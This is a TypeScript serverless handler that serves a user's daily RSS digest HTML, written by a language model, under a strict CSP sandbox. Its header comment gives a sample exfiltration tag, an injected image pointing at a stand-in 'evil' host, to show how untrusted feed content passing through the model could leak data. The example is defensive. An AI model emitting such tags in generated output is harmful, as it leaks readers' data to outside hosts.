// functions/api/digests/[date].ts — serve one daily feed digest from R2.
//
// GET /api/digests/<YYYY-MM-DD>[?mode=light|dark] → the digest HTML. Keys are
// `${email}/<date>.html`, written by the local feed-digest routine, so a
// caller only ever reads their own digests.
//
// The HTML is LLM output built from untrusted RSS, so it's served under a CSP
// sandbox (no scripts, opaque origin) that blocks every subresource except
// Google Fonts: an injected <img src=https://evil/?d=…> would otherwise phone
// home on each view. Popups stay allowed so links can open in a new tab.

import { getUserEmail } from '../../_lib/auth';
import type { Env } from '../../_lib/types';

const CSP = [
  'sandbox allow-popups allow-popups-to-escape-sandbox',
  "default-src 'none'",
  "style-src 'unsafe-inline' https://fonts.googleapis.com",
  'font-src https://fonts.gstatic.com',
  'img-src data:',
].join('; ');

export const onRequestGet: PagesFunction<Env, 'date'> = async ({ request, env, params }) => {
  const date = String(params.date);
  const obj = /^\d{4}-\d{2}-\d{2}$/.test(date)
    ? await env.DIGESTS.get(`${getUserEmail(request, env)}/${date}.html`)
    : null;
  if (!obj) return html('<p style="color:GrayText;font-size:13px">这天没有日报。</p>', 404);

  // The dashboard's light/dark toggle isn't visible to this page; pass it as <html data-mode>.
  const mode = new URL(request.url).searchParams.get('mode');
  let body = await obj.text();
  if (mode === 'light' || mode === 'dark') body = body.replace(/<html\b/i, `<html data-mode="${mode}"`);
  return html(body, 200);
};

function html(body: string, status: number): Response {
  return new Response(body, {
    status,
    headers: {
      'content-type': 'text/html; charset=utf-8',
      'content-security-policy': CSP,
      'referrer-policy': 'no-referrer',
      'cache-control': 'private, no-cache',
    },
  });
}
